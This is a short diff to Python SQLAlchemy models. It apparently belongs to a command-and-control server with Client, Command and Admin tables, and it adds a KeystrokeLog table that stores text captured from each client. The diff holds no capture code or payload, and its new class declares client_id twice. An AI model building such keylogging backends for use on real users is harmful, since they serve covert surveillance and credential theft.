@@ -14,6 +14,7 @@ class Client(Base):
     is_active = Column(Boolean, default=True)
     operating_system = Column(String)
 
+    keystroke_logs = relationship("KeystrokeLog", back_populates="client")
 
 class Command(Base):
 
@@ -33,3 +34,15 @@ class Admin(Base):
     id = Column(Integer, primary_key=True, index=True)
     username = Column(String, unique=True, index=True)
     password = Column(String)
+
+
+class KeystrokeLog(Base):
+    __tablename__ = 'keystroke_logs'
+
+    id = Column(Integer, primary_key=True, index=True)
+    client_id = Column(Integer, ForeignKey('clients.id'))
+    timestamp = Column(DateTime, default=datetime.utcnow)
+    text = Column(Text)
+
+    client = relationship("Client", back_populates="keystroke_logs")
+    client_id = Column(Integer, ForeignKey('clients.id'))
